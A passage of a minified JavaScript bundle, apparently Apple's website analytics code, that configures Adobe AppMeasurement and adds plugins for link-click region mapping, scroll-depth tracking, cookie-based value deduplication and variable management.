formattedLocale=this.conf.locale.toLowerCase();this.formattedValues.countryCodeFilter=formatter.countryCodeFilter(formattedLocale),this.formattedValues.legacyCountryCode=formatter.legacyCountryCode(formattedLocale),this.formattedValues.pageName=formatter.pageName(this.conf.pageName,formattedLocale),this.formattedValues.channel=formatter.channel(this.conf.channel,formattedLocale),this.formattedValues.productName=formatter.productName(this.conf.productName),this.formattedValues.campaign=this.conf.campaign,this._setConfigurationProperty(dlKeys.linkInternalFiltersLocale,this._getLinkInternalFiltersLocale(this.formattedValues.countryCodeFilter)),this._setConfigurationProperty(dlKeys.computedCampaign,this.formattedValues.campaign),this._setConfigurationProperty(dlKeys.computedProductName,this.formattedValues.productName),this._setConfigurationProperty(dlKeys.computedPageName,this.formattedValues.pageName),this._setConfigurationProperty(dlKeys.legacyCountryCode,this.formattedValues.legacyCountryCode),this._setConfigurationProperty(dlKeys.countryCodeFilter,this.formattedValues.countryCodeFilter),set(confKey,this.conf),set(["pageDataModel","config","global","cookieDomain"],this.conf[dlKeys.trackingDomain]),this.templateVarArr=templateVarHelper.set(),this._setConfigurationProperty(dlKeys.bucket,this._getBucket(this.conf,this.formattedValues.legacyCountryCode)),set([confKey,dlKeys.bucket],this.conf.bucket),this.conf[dlKeys.computedChannel]=this._replaceTemplateVars(this.formattedValues.channel),set([confKey,dlKeys.computedChannel],this.conf.computedChannel),Object.keys(this.options).forEach((key=>{set([optionsKey,key],this.options[key])})),this.conf={}}_setConfigurationProperty(property,value){void 0===this.conf[property]&&(this.conf[property]=value)}_hasRequiredData(data){return!Object.values(data).some((val=>void 0===val||""===val))}getAppMeasurementConfig(){const conf=get(confKey),data={acAnalytics:{},options:{}};data.acAnalytics.version=conf[dlKeys.acAnalyticsVersion],data.acAnalytics.trackingDomain=data.Ia=conf[dlKeys.trackingDomain],data.cookieDomainPeriods=conf[dlKeys.cookieDomainPeriods],data.pageName=conf[dlKeys.computedPageName],data.bucket=conf[dlKeys.bucket];const extraReportSuite=window.localStorage.getItem("acAnalyticsValidationExtraReportSuite");extraReportSuite&&"string"==typeof extraReportSuite&&(data.bucket.includes(extraReportSuite)||(data.bucket+=`,${extraReportSuite}`)),data.channel=conf[dlKeys.computedChannel],data.currencyCode=conf[dlKeys.currencyCode],data.trackDownloadLinks=!0,data.trackExternalLinks=!0,data.trackInlineStats=!0,data.useForcedLinkTracking=!0,data.forcedLinkTrackingTimeout=100,data.linkDownloadFileTypes=conf[dlKeys.linkDownloadFileTypes],data.linkInternalFilters="tel:,mailto:,javascript:,"+data.acAnalytics.trackingDomain+","+data.acAnalytics.trackingDomain+"/media,"+data.acAnalytics.trackingDomain+"/105",data.linkLeaveQueryString=!1,data._isSafari=!1,data.usePlugins=!0,data.doPlugins=doPlugins,data.cookieLifetime=conf[dlKeys.cookieLifetime],data.writeSecureCookies=!0,data.trackingServer=conf[dlKeys.trackingServer],data.trackingServerSecure=conf[dlKeys.trackingServerSecure];const trackingServer=window.localStorage.getItem("acAnalyticsValidatationTrackingServer");trackingServer&&"string"==typeof trackingServer&&(data.trackingServerSecure=trackingServer),data.dc=this.getDataCenterId();let overrides={};return conf&&conf.options&&(data.options=conf.options,conf.options.overrides&&(overrides=conf.options.overrides,Object.keys(data).forEach((key=>{data[key]=overrides[key]})))),data.options.corePlugins=corePlugins,data}resetReferrer(){let referrer;this.options&&this.options.referrer?referrer=this.options.referrer:(referrer=get([confKey,dlKeys.pageURL]),set([confKey,dlKeys.referrer],referrer))}resetLoadTiming(){this.conf.loadTiming=Date.now()}destroyObservers(){observerRegistry.destroy()}preAppMeasurementInit(data){return cookie.updateCookieOptions(data.acAnalytics.trackingDomain),set([confKey,dlKeys.specialExitLinks],generateSpecialExitLinks()),data}getTrackingDomain(){return constants.domainRegex.test(window.location.hostname)?"apple.com.cn":"apple.com"}setCookieDomainPeriods(){return constants.domainRegex.test(window.location.hostname)?"3":"2"}destroyAppMeasurement(){const appMeasurement=appMeasurementSetup.getInstance();triggerNewPage(),"object"==typeof appMeasurement&&(appMeasurement.ac_amt.destroy(),appMeasurement.manageVars("clearVars"),appMeasurement.tcall=void 0,appMeasurement.pageURL=appMeasurement.g_prop6=appMeasurement.g_pageURL=appMeasurement.g_channel="")}submit(trackingData){const appMeasurement=appMeasurementSetup.getInstance();trackingData&&"object"==typeof trackingData||errorHandler.log(moduleName,"submit",`Request param (${trackingData}) is not an object`),errorHandler.exception||(trackingData.type&&"string"==typeof trackingData.type||errorHandler.log(moduleName,"submit",`property "type" (${trackingData.type}") must be a string`),window.s&&"object"==typeof window.s||errorHandler.log(moduleName,"submit",`appMeasurement (${window.s}) is not an object`),errorHandler.exception||trackingData.submitMethod&&submitMethods[trackingData.submitMethod]&&(this._setAppMeasurementProps(trackingData),submitMethods[trackingData.submitMethod](trackingData,get(confKey),appMeasurement)))}_getLinkInternalFiltersLocale(countryCodeFilter){let value="";return"us"!==countryCodeFilter&&(value=countryCodeFilter),value}_setAppMeasurementProps(trackingData){const beacon=trackingData.beacon||{};trackingData.linkTrackVars=[];const appMeasurement=appMeasurementSetup.getInstance();appMeasurement.linkTrackEvents="";for(const key in beacon)"events"===key&&"page"!==trackingData.type&&(beacon[key]=eventsToString(beacon[key]),appMeasurement.linkTrackEvents=beacon[key].replace(/=([^,]+)/g,"")),"title"!==key&&("page"!==trackingData.type&&trackingData.linkTrackVars.push(key),appMeasurement[key]=beacon[key])}_getProductName(track){const analyticsPageTitle=this._strToArray(track);if(Array.isArray(analyticsPageTitle)&&0!==analyticsPageTitle.length||errorHandler.log(moduleName,"_getProductname",'"track" meta tag value is malformed. e.g. "product name - page name"'),!errorHandler.exception)return analyticsPageTitle[0].trim()}_getPageName(track){if(track&&""!==track?track.match(/[^\S ]/g)&&errorHandler.warn(moduleName,"_getPageName",'"track" meta tag value includes an invalid whitespace character, identified by the following regex: "[^\\S ]"'):errorHandler.log(moduleName,"_getPageName",'"track" meta tag value is malformed. e.g. "product name - page name"'),errorHandler.exception)return;let pgEscaped=escape(track);return pgEscaped=pgEscaped.replace(/(%u2018|%u2019|%u02BC|%u02BD)/g,"%27"),pgEscaped=pgEscaped.replace(/(%u201C|%u201D|%E2%80%9C|%E2%80%9D)/g,"%22"),pgEscaped=pgEscaped.replace(/(%09|%0A|%0D)/g,""),(track=unescape(pgEscaped)).toLowerCase()}_getPageType(pageName){return"search - results"===pageName?"search":"404 - page not found"===pageName?"errorPage":"normal"}_getSearchTerm(){return window.location.pathname.split("/").filter((item=>item)).pop()}_getLocale(){if(!document||!document.documentElement)return;const htmlEl=document.documentElement;return htmlEl.getAttribute("data-locale")||htmlEl.lang}_getPlatform(){let value="other";const userAgent=navigator.userAgent,patterns={"mobile other":"/(kindle|silk-accelerated|android|webos|rim tablet os|windows phone)/i",windows:/windows/i,"iphone/ipod touch":/(iphone|ipod)/i,ipad:/(ipad)/i,Mac:/Mac OS X/i};for(const key in patterns)if(userAgent.match(patterns[key])){value=key;break}return value}_strToArray(str,separator){if(separator=separator||"-","string"!=typeof str&&errorHandler.log(moduleName,"_strToArray",str+" is not a valid string"),!errorHandler.exception)return str.split(separator)}_transformPropertyName(name){return name.replace(/^s-/,"").replace(/-+(.)?/g,(function(match,character){return character?character.toUpperCase():""}))}_getBucket(data,legacyCountryCode){const countryBucketSize=constants.countryBuckets.length;let index=2;for(let i=0;i<countryBucketSize;i++)if(-1!==constants.countryBuckets[i].indexOf(legacyCountryCode)){index=i;break}const bucket=this._replaceTemplateVars(data["bucket"+index]);if(bucket||errorHandler.log(moduleName,"bucket","analytics-s-bucket-"+index+" metadata tag must exist"),errorHandler.exception)return;const bucketProduct=this._replaceTemplateVars(data["bucketProduct"+index]),bucketStore=this._replaceTemplateVars(data.bucketStore);return bucket+(bucketProduct?","+bucketProduct:"")+(bucketStore?","+bucketStore:"")}_replaceTemplateVars(str){return templateVarHelper.translate(str,this.templateVarArr)}isSafariTopSitesPreview(){return!(!navigator||!navigator.loadPurpose||"preview"!==navigator.loadPurpose)}getTrackingServer(){return this._isProduction()?"metrics."+this.conf[dlKeys.trackingDomain]:window.location.hostname}getSecureTrackingServer(){return this._isProduction()?"securemetrics."+this.conf[dlKeys.trackingDomain]:window.location.hostname}getDataCenterId(){return 112}_isProduction(){const productionUrls=this.generateProdURLs(),hostname=window.location.host;return productionUrls.indexOf(hostname)>-1}generateProdURLs(){const trackingDomain=this.conf[dlKeys.trackingDomain],prodUrlsArr=[],subdomainSupportedDomains=constants.supportedSubdomains||["apple.com"],subdomains=constants.subdomains||["www"];return-1!==subdomainSupportedDomains.indexOf(trackingDomain)&&subdomains.forEach((function(subdomain){prodUrlsArr.push(subdomain+"."+trackingDomain)})),prodUrlsArr}_bindMethods(){this._replaceTemplateVars=this._replaceTemplateVars.bind(this)}}},{"../ErrorHandler":356,"../constants":359,"../helpers/cookie":362,"../helpers/dataLayer":363,"../helpers/eventsToString":366,"../helpers/formatter":368,"../helpers/generateSpecialExitLinks":369,"../helpers/templateVar":383,"../observers/observerRegistry":396,"./appMeasurementPlugins":310,"./doPlugins/doPlugins":321,"./submit-methods/submitMethods":353,"@apple/analytics-biscuit-tin":27,"@apple/analytics-data-layer":46,"@apple/analytics-passive-tracker":126,"@apple/analytics-utils":190,"@marcom/appmeasurement-setup":288}],310:[function(require,module,exports){const plugins=[require("./appMeasurementPlugins/AppMeasurementTools"),require("./appMeasurementPlugins/utilities/utilities"),require("./appMeasurementPlugins/linkHandler"),require("./appMeasurementPlugins/getPercentPageViewed"),require("./appMeasurementPlugins/getQueryParam"),require("./appMeasurementPlugins/getValOnce"),require("./appMeasurementPlugins/activitymap/link"),require("./appMeasurementPlugins/activitymap/region"),require("./appMeasurementPlugins/activitymap/ActivityMapCollection")];module.exports=plugins},{"./appMeasurementPlugins/AppMeasurementTools":311,"./appMeasurementPlugins/activitymap/ActivityMapCollection":312,"./appMeasurementPlugins/activitymap/link":314,"./appMeasurementPlugins/activitymap/region":315,"./appMeasurementPlugins/getPercentPageViewed":316,"./appMeasurementPlugins/getQueryParam":317,"./appMeasurementPlugins/getValOnce":318,"./appMeasurementPlugins/linkHandler":319,"./appMeasurementPlugins/utilities/utilities":320}],311:[function(require,module,exports){"use strict";module.exports=function(am){am.ac_amt&&am.ac_amt._isEmpty&&am.ac_amt.eventListeners&&!am.ac_amt._isEmpty(am.ac_amt.eventListeners)&&am.ac_amt.destroy&&am.ac_amt.destroy(),am.ac_amt={addListener:function(key,node,type,listener,options){key&&node&&type&&listener&&(this.eventListeners[key]&&this.removeListener(this.eventListeners[key]),this.eventListeners[key]={node:node,type:type,listener:listener},node.addEventListener(type,listener,options))},destroy:function(){this.removeListeners()},removeListeners:function(){if(this.eventListeners){for(const key in this.eventListeners)this.eventListeners.hasOwnProperty(key)&&this.removeListener(key,this.eventListeners[key].node,this.eventListeners[key].type,this.eventListeners[key].listener);this.eventListeners={}}},removeListener:function(key,node,type,listener){key&&node&&type&&listener&&(node.removeEventListener(type,listener),delete this.eventListeners[key])},eventListeners:{},options:{reinitializeActivityMapCollection:!0},_isEmpty:function(obj){for(const key in obj)if(obj.hasOwnProperty(key))return!1;return!0}}}},{}],312:[function(require,module,exports){"use strict";const _ancestor=require("@marcom/dom-traversal/ancestor"),_isAncestorOf=require("@marcom/dom-traversal/isAncestorOf"),_helpers=require("./helpers/helpers.js");function ActivityMapCollection(){this._regionSelectors=["[data-analytics-activitymap-region-id]","[data-analytics-section-engagement]","[data-card-analytics]"],this._globalRegionSelectors=['[data-analytics-region="buy strip"]',"#globalnav","#ac-globalnav","#ac-localnav","#ac-globalfooter","#chapternav"],this.createActivityMapCollection=this.createActivityMapCollection.bind(this),this.addElToCollection=this.addElToCollection.bind(this)}const proto=ActivityMapCollection.prototype;proto.init=function(am){this.AppMeasurement=am,this.AppMeasurement&&this.AppMeasurement.ac_amt&&("complete"!==document.readyState&&"interactive"!==document.readyState&&this.AppMeasurement.ac_amt.addListener?this.AppMeasurement.ac_amt.addListener("amc_readystatechange",document,"readystatechange",(event=>{"interactive"!==event.target.readyState&&"complete"!==event.target.readyState||this.createActivityMapCollection()})):this.AppMeasurement.ac_amt.options&&this.AppMeasurement.ac_amt.options.reinitializeActivityMapCollection&&this.createActivityMapCollection())},proto.createActivityMapCollection=function(){this.AppMeasurement=this.AppMeasurement||window.s,this.AppMeasurement&&(this.AppMeasurement.acAnalyticsActivityMapCollection=null,this.AppMeasurement.acAnalyticsActivityMapCollection=this._assembleActivityMapCollection())},proto._createLinkData=function(node){const region=this._determineRegionName(node,this._globalRegionElements,this._regionSelectors);return{element:node,linkId:this._createLinkId(node,region.id),regionElement:region.el,regionName:region.id}},proto.addElToCollection=function(node){const linkData=this._createLinkData(node);return this._addToActivityMapCollection(linkData)},proto._addToActivityMapCollection=function(linkData){let duplicationCheckStr,duplicate,noUniqueId=!0,duplicationNumber=0;if(duplicate=this.AppMeasurement.acAnalyticsActivityMapCollection.filter((function(obj){return obj.linkId===linkData.linkId}))[0],duplicate)duplicate.linkId=duplicate.linkId.concat(" - ","#",_helpers.prefixCharacters(1)),linkData.linkId=linkData.linkId.concat(" - ","#",_helpers.prefixCharacters(2));else for(;noUniqueId;)duplicationNumber++,duplicationCheckStr=linkData.linkId.concat(" - ","#",_helpers.prefixCharacters(duplicationNumber)),duplicate=this.AppMeasurement.acAnalyticsActivityMapCollection.filter((function(obj){return obj.linkId===duplicationCheckStr}))[0],duplicate||(noUniqueId=!1,duplicationNumber>1&&(linkData.linkId=duplicationCheckStr));this.AppMeasurement.acAnalyticsActivityMapCollection.push(linkData)},proto._assembleActivityMapCollection=function(){this._globalRegionElements=_helpers.getGlobalElements(this._globalRegionSelectors);const linkEls=document.querySelectorAll("a, button"),collection=[];for(let j=0;j<linkEls.length;j++){const linkData=this._createLinkData(linkEls[j]);collection.push(linkData)}return this._renameDuplicateIds(collection)},proto._renameDuplicateIds=function(collection){const count={},location={};for(let i=0;i<collection.length;i++){const currentId=collection[i].linkId;count[currentId]=count[currentId]?count[currentId]+1:1,count[currentId]>1?collection[i].linkId=collection[i].linkId+" - #"+_helpers.prefixCharacters(count[currentId]):location[currentId]=i,2===count[currentId]&&(collection[location[currentId]].linkId=collection[location[currentId]].linkId+" - #01")}return collection},proto._determineRegionName=function(linkEl,globalRegionElements,regionSelectors){let regionEl=null,regionId=null;for(let i=0;i<globalRegionElements.length;i++)_isAncestorOf(globalRegionElements[i],linkEl)&&!regionEl&&(regionEl=globalRegionElements[i],regionId="ac-globalnav"===globalRegionElements[i].id?regionEl.getAttribute("data-analytics-region")||"global nav":regionEl.id||regionEl.getAttribute("data-analytics-region"));if(!regionEl&&(regionEl=_ancestor(linkEl,regionSelectors.join(","),!0),regionEl)){const currentRegionSelector=regionSelectors.find((selector=>regionEl.hasAttribute(_helpers.removeArrayBrackets(selector))));regionId=regionEl.getAttribute(_helpers.removeArrayBrackets(currentRegionSelector)),"[data-analytics-section-engagement]"===currentRegionSelector&&(regionId=regionId.replace("name:",""))}return regionEl||(regionEl=document.body,regionId="body"),{el:regionEl,id:regionId.toLowerCase()}},proto._createLinkId=function(el,region){const linkText=_helpers.createLinkText(el),linkHref=_helpers.createLinkHref(el,this.AppMeasurement),linkRegion=_helpers.limitStrLength(region,40);return _helpers.createLinkId(linkText,linkHref,linkRegion," - ").toLowerCase()},module.exports=new ActivityMapCollection},{"./helpers/helpers.js":313,"@marcom/dom-traversal/ancestor":293,"@marcom/dom-traversal/isAncestorOf":295}],313:[function(require,module,exports){"use strict";function Helpers(){this.createLinkId=this.createLinkId.bind(this)}const proto=Helpers.prototype;proto.prefixCharacters=function(id,numberOfCharacters,prefixCharacter){let prefix="";for(numberOfCharacters=numberOfCharacters||2,prefixCharacter=prefixCharacter||0;numberOfCharacters;)prefix+=prefixCharacter,numberOfCharacters--;return prefix.substring(0,prefix.length-id.toString().length)+id},proto.limitStrLength=function(str,characters){return str.substring(0,characters).trim()},proto.removeArrayBrackets=function(str){return"["===str[0]&&"]"===str[str.length-1]?str.substr(1,str.length-2):str},proto.getGlobalElements=function(arr){const storage=[];for(let i=0;i<arr.length;i++){const el=document.querySelector(arr[i]);el&&storage.push(el)}return storage},proto.createLinkText=function(el){let linkText=el.getAttribute("data-analytics-activitymap-link-id")||el.getAttribute("data-ac-gallery-trigger")||el.getAttribute("data-analytics-title")||this.removeSpecialChars(el.textContent)||el.id||el.tagName||"no text";return this.limitStrLength(linkText,50)},proto.createLinkHref=function(el,am){let externalLink,linkHref;return el.protocol&&"http:"!==el.protocol&&"https:"!==el.protocol?linkHref=el.protocol.substring(0,el.protocol.length-1):(el.hostname!==window.location.hostname&&el.hostname!=="www."+am.acAnalytics.trackingDomain&&(externalLink=el.hostname+el.pathname),linkHref=externalLink||el.hash||el.pathname||"no href"),linkHref},proto.createLinkId=function(text,href,region,delimiter){let limitForHref,trimmedHref,linkId=text.concat(delimiter,href,delimiter,region);return linkId.length>128&&(limitForHref=128-text.concat(delimiter,delimiter,region).length,trimmedHref=this.limitStrLength(href,limitForHref),linkId=text.concat(delimiter,trimmedHref,delimiter,region)),linkId},proto.removeSpecialChars=function(strToClean){let cleanStr;if(strToClean){const regexStr=["&rlm;","\\u200F","&#8207;","&#x200f;"].join("|"),regexNotAllowedChars=new RegExp(regexStr,"gi");cleanStr=strToClean.replace(regexNotAllowedChars,"").replace(/\s+/g," ").trim()}return cleanStr},module.exports=new Helpers},{}],314:[function(require,module,exports){"use strict";const ActivityMapCollection=require("./ActivityMapCollection"),useragent=require("@marcom/useragent-detect"),initialBagState=useragent.browser.firefox||useragent.browser.ie?"open":"close",alteredBagState=useragent.browser.firefox||useragent.browser.ie?"close":"open";function getBagString(action,path){return`${action} - bag - ${path} - globalnav - ${action}`}module.exports=function(appMeasurement){appMeasurement.ActivityMap.link=function(linkElement,linkName){let activityMapItem;function findInCollection(el){return(appMeasurement.acAnalyticsActivityMapCollection||[]).filter((function(obj){return obj.element.isSameNode(el)}))[0]}if((!linkName||-1===linkName.indexOf("v@e")&&-1===linkName.indexOf("v@sk")&&-1===linkName.indexOf("v@m"))&&linkElement&&!linkElement.hasAttribute("data-analytics-ignore-link")){if(activityMapItem=findInCollection(linkElement),activityMapItem){if(-1!==activityMapItem.linkId.indexOf("/shop/goto/bag")){const path=function getPath(href){return href.replace(/.+\.com(\.cn)?/,"")}(activityMapItem.element.href);return"true"===activityMapItem.element.getAttribute("aria-expanded")?getBagString(initialBagState,path):getBagString(alteredBagState,path)}return activityMapItem.linkId}return ActivityMapCollection.addElToCollection(linkElement),activityMapItem=findInCollection(linkElement),activityMapItem?activityMapItem.linkId:void 0}}}},{"./ActivityMapCollection":312,"@marcom/useragent-detect":308}],315:[function(require,module,exports){"use strict";module.exports=function(appMeasurement){appMeasurement.ActivityMap.region=function(el){if(!el)return;const result=appMeasurement.acAnalyticsActivityMapCollection.filter((function(obj){return obj.element.isSameNode(el)}))[0];return result?result.regionName:void 0}}},{}],316:[function(require,module,exports){"use strict";const isStorageAvailable=require("../../helpers/isStorageAvailable"),SESSION_STORAGE=require("../../constants").sessionStorage;module.exports=function(appMeasurement){isStorageAvailable(SESSION_STORAGE)&&(appMeasurement.getPercentPageViewed=function(){if(void 0===s.linkType){try{s.ppv.previous=sessionStorage.getItem(s.ppv.sessionStorageKey)?sessionStorage.getItem(s.ppv.sessionStorageKey):""}catch(a){}return s.ppv.init(),s.ppv.previous.split(",")}if(!s.ppv.previous){try{s.ppv.previous=sessionStorage.getItem(s.ppv.sessionStorageKey)||""}catch(a){}return s.ppv.init(),s.ppv.previous.split(",")}},appMeasurement.ppv={initialPercent:0,maxPercent:0,throttleAmount:500,sessionStorageKey:"s_ppv",init:function(){s&&s.ac_amt&&s.ac_amt.addListener&&(s.ac_amt.addListener("ppv_scroll",window,"scroll",s.ppv.throttle(s.ppv.scroll,s.ppv.throttleAmount),false),s.ac_amt.addListener("ppv_resize",window,"resize",s.ppv.throttle(s.ppv.scroll,s.ppv.throttleAmount),false),s.ac_amt.addListener("ppv_beforeunload",window,"beforeunload",s.ppv.unload,false),"complete"!==document.readyState?s.ac_amt.addListener("ppv_load",window,"load",s.ppv.scroll,false):s.ppv.scroll())},scroll:function(){const a=s.ppv;if(100!==a.maxPercent){const g=void 0!==window.pageYOffset?window.pageYOffset:document.documentElement||document.body.parentNode||document.body.scrollTop,d=document.clientHeight||document.documentElement.clientHeight||document.body.clientHeight;let b=a.getDocHeight();if(b=Math.round((g+d)/b*100),a.initialPercent||(a.initialPercent=b),b>a.maxPercent){a.maxPercent=b;const c=[];c.push(s.pageName),c.push(b),c.push(a.initialPercent),c.push(g+d);try{sessionStorage.setItem(a.sessionStorageKey,c.join(","))}catch(e){}}}},getDocHeight:function(){const a=window.document;return Math.max(Math.max(a.body.scrollHeight,a.documentElement.scrollHeight),Math.max(a.body.offsetHeight,a.documentElement.offsetHeight),Math.max(a.body.clientHeight,a.documentElement.clientHeight))},unload:function(){try{sessionStorage.getItem(s.ppv.sessionStorageKey)&&sessionStorage.setItem(s.ppv.sessionStorageKey,sessionStorage.getItem(s.ppv.sessionStorageKey))}catch(a){}},throttle:function(a,g){let b,c,e=null,f=0;const l=function(){f=new Date,e=null,c=a.apply(undefined,b)};return function(){const h=new Date;f||(f=h);const k=g-(h-f);return b=arguments,k<=0?(clearTimeout(e),e=null,f=h,c=a.apply(this,b)):e||(e=setTimeout(l,k)),c}}})}},{"../../constants":359,"../../helpers/isStorageAvailable":375}],317:[function(require,module,exports){"use strict";module.exports=function(appMeasurement){appMeasurement.getQueryParam=appMeasurement.Util.getQueryParam}},{}],318:[function(require,module,exports){"use strict";module.exports=function(appMeasurement){appMeasurement.getValOnce=function(sPropertyValue,cookieName,expirationInDays,useMinutesInsteadOfDays){sPropertyValue=sPropertyValue||"",cookieName=cookieName||"s_gvo",expirationInDays=expirationInDays||0;const previousCookieValue=this.c_r(cookieName);if(sPropertyValue){let expirationDate=0;if(0!==expirationInDays){expirationDate=new Date;const expirationDuration=expirationInDays*("m"===useMinutesInsteadOfDays?6e4:864e5);expirationDate.setTime(expirationDate.getTime()+expirationDuration)}this.c_w(cookieName,sPropertyValue,expirationDate)}return sPropertyValue===previousCookieValue?"":sPropertyValue}}},{}],319:[function(require,module,exports){"use strict";module.exports=function(appMeasurement){appMeasurement.p_gn=function(t,h){var n,x,i=t?t.indexOf("~"):-1;return t&&h&&(n=i<0?"":t.substring(0,i),x=t.substring(i+1),h.indexOf(x.toLowerCase())>-1)?n||"[[":0},appMeasurement.p_gh=function(){var s=this;if(s.linkObject)return s.linkObject.href;if(!s.eo&&!s.lnk)return"";var o=s.eo?s.eo:s.lnk,y=s.ot(o),n=s.oid(o);o.s_oidt;if(s.eo&&o==s.eo)for(;o&&!n&&"BODY"!=y;){if(!(o=o.parentElement?o.parentElement:o.parentNode))return"";y=s.ot(o),n=s.oid(o),o.s_oidt}return o.href?o.href:""},appMeasurement.pt=function(x,d,f,a){for(var y,r,t=x,z=0;t;){if(y=(y=t.indexOf(d))<0?t.length:y,t=t.substring(0,y),r=this[f](t,a))return r;z+=y+d.length,t=x.substring(z,x.length),t=z<x.length?t:""}return""},appMeasurement.linkHandler=function(p,t,e){var i,l,s=this,o=s.p_gh(),h=o;return t=t||"o",!h||s.linkType&&(h||s.linkName)?"":(i=h.indexOf("?"),h=s.linkLeaveQueryString||i<0?h:h.substring(0,i),(l=s.pt(p,"|","p_gn",h.toLowerCase()))?(s.linkName="[["==l?"":l,s.linkType=t,e?o:h):"")}}},{}],320:[function(require,module,exports){"use strict";module.exports=function(appMeasurement){appMeasurement.manageVars=function(c,l,f){var vl,la,vla,s=this;if(l=l||"",f=f||1,!s[c])return!1;vl="pageName,purchaseID,channel,server,pageType,campaign,state,zip,events,products,transactionID";for(var n=1;n<76;n++)vl+=",prop"+n;for(n=1;n<251;n++)vl+=",eVar"+n;for(n=1;n<6;n++)vl+=",hier"+n;for(n=1;n<4;n++)vl+=",list"+n;for(n in s.contextData)vl+=",contextData."+n;if(!l||1!=f&&2!=f)return""==l&&1==f&&(s.pt(vl,",",c,0),!0);if(1==f&&(vl=l.replace("['",".").replace("']","")),2==f){for(var x in la=l.split(","),vla=vl.split(","),vl="",la)if(la.hasOwnProperty(x))for(var y in la[x].indexOf("contextData")>-1&&(lax=la[x].split("'"),la[x]="contextData."+lax[1]),vla)la[x]==vla[y]&&(vla[y]="");for(var y in vla)vl+=vla[y]?","+vla[y]:""}return s.pt(vl,",",c,0),!0},appMeasurement.clearVars=function(t){if(-1==t.indexOf("contextData"))this[t]="";else if(t.indexOf("contextData")>-1){var c=t.substring(t.indexOf(".")+1);this.contextData[c]=""}},appMeasurement.lowercaseVars=function(t){var s=this;if("events"!=t&&-1==t.indexOf("contextData")&&s[t])s[t]=s[t].toString(),0!=s[t].indexOf("D=")&&(s[t]=s[t].toLowerCase());else if(t.indexOf("contextData")>-1){var c=t.substring(t.indexOf(".")+1);s.contextData[c]&&(s.contextData[c]=s.contextData[c].toString(),s.contextData[c]=s.contextData[c].toLowerCase())}},appMeasurement.pt=function(x,d,f,a){for(var y,r,t=x,z=0;t;){if(y=(y=t.indexOf(d))<0?t.length:y,t=t.substring(0,y),r=this[f](t,a))return r;z+=y+d.length,t=x.substring(z,x.length),t=z<x.length?t:""}return""},appMeasurement.join=function(v,p){var f,b,d,w;p&&(f=p.front?p.front:"",b=p.back?p.back:"",d=p.delim?p.delim:"",w=p.wrap?p.wrap:"");for(var str="",x=0;x<v.length;x++)"object"==typeof v[x]?str+=this.join(v[x],p):str+=w+v[x]+w,x<v.length-1&&(str+=d);return f+str+b},appMeasurement.apl=function(L,v,d,u){var m=0;if(L||(L=""),u){var i,n,a=this.split(L,d);for(i=0;i<a.length;i++)n=a[i],m=m||(1==u?n==v:n.toLowerCase()==v.toLowerCase())}return m||(L=L?L+d+v:v),L},appMeasurement.split=function(l,d){for(var i,x=0,a=new Array;l;)i=(i=l.indexOf(d))>-1?i:l.length,a[x++]=l.substring(0,i),l=l.substring(i+d.length);return a}}},{}],321:[function(require,module,exports){const doPluginsRegistry=require("./doPluginsRegistry");module.exports=function doPlugins(am){doPluginsRegistry.run(am)}},{"./doPluginsRegistry":322}],322:[function(require,module,exports){class DoPluginsPhase{constructor(name){this.name=name,this.steps=[]}}class DoPluginsStage{constructor(name,phases){this.name=name,this.phases=phases,this.phases.forEach((phase=>{this[phase.name]=phase}))}}const doPluginsRegistry=new class DoPluginsRegistry{constructor(stages){this.stages=stages,this.stages.forEach((stage=>{this[stage.name]=stage}))}run(am){this.stages.forEach((stage=>{stage.phases&&stage.phases.forEach((phase=>{phase.steps&&phase.steps.forEach((step=>{step(am)}))}))}))}}([new DoPluginsStage("pretracking",[new DoPluginsPhase("initialize"),new DoPluginsPhase("main"),new DoPluginsPhase("finalize")]),new DoPluginsStage("tracking",[new DoPluginsPhase("initialize"),new DoPluginsPhase("sideEffects"),new DoPluginsPhase("main"),new DoPluginsPhase("finalize"),new DoPluginsPhase("sanitize")]),new DoPluginsStage("cleanup",[new DoPluginsPhase("initialize"),new DoPluginsPhase("main"),new DoPluginsPhase("finalize")])]),trackingState=require("./plugins/trackingState");doPluginsRegistry.pretracking.main.steps.push(require("./plugins/referrerQueryParam")),doPluginsRegistry.tracking.sideEffects.steps.push(require("./plugins/handleLink"),require("./plugins/specialRssLinks")),doPluginsRegistry.tracking.main.steps.push(trackingState.begin,require("./plugins/acAnalyticsVersion"),require("./plugins/externalCampaign"),require("./plugins/internalCampaign"),require("./plugins/percentPageViewed"),require("./plugins/afid"),require("./plugins/retailCookies"),require("./plugins/feedbackPage"),require("./plugins/contactRetail"),require("./plugins/asTex"),require("./plugins/enhanceDownloadLinks"),require("./plugins/langLocale"),require("./plugins/userSignInStatus"),require("./plugins/pageName"),require("./plugins/asPvi"),require("./plugins/hierarchy1"),require("./plugins/referrerAndCurrentUrl"),require("./plugins/clickTimer"),require("./plugins/beaconType"),require("./plugins/linkMissingTitle")),doPluginsRegistry.tracking.finalize.steps.push(require("./plugins/passiveTracker"),require("./plugins/newPassiveTracker")),doPluginsRegistry.tracking.sanitize.steps.push(require("./plugins/removeSpacesInLinkTrackVars"),require("./plugins/manageVars")),doPluginsRegistry.cleanup.main.steps.push(require("./plugins/clearLinkTracksAfterDownloadAndExit")),doPluginsRegistry.cleanup.finalize.steps.push(trackingState.end,require("./plugins/setTcallToFalse")),module.exports=doPluginsRegistry},{"./plugins/acAnalyticsVersion":324,"./plugins/afid":325,"./plugins/asPvi":326,"./plugins/asTex":327,"./plugins/beaconType":328,"./plugins/clearLinkTracksAfterDownloadAndExit":329,"./plugins/clickTimer":330,"./plugins/contactRetail":331,"./plugins/enhanceDownloadLinks":332,"./plugins/externalCampaign":333,"./plugins/feedbackPage":334,"./plugins/handleLink":335,"./plugins/hierarchy1":336,"./plugins/internalCampaign":337,"./plugins/langLocale":338,"./plugins/linkMissingTitle":339,"./plugins/manageVars":340,"./plugins/newPassiveTracker":341,"./plugins/pageName":342,"./plugins/passiveTracker":343,"./plugins/percentPageViewed":344,"./plugins/referrerAndCurrentUrl":345,"./plugins/referrerQueryParam":346,"./plugins/removeSpacesInLinkTrackVars":347,"./plugins/retailCookies":348,"./plugins/setTcallToFalse":349,"./plugins/specialRssLinks":350,"./plugins/trackingState":351,"./plugins/userSignInStatus":352}],323:[function(require,module,exports){const get=require("@apple/analytics-data-layer").get,set=require("@apple/analytics-data-layer").set,dataLayerConfig=require("../../constants").dataLayer.configuration,isIntraPageLink=require("../../helpers/DOM").isIntraPageLink;function isMicroEvent(am){return!!am.linkType}function isPageLoad(am){return am.tcall}function getPropertyRegex(am,...args){let 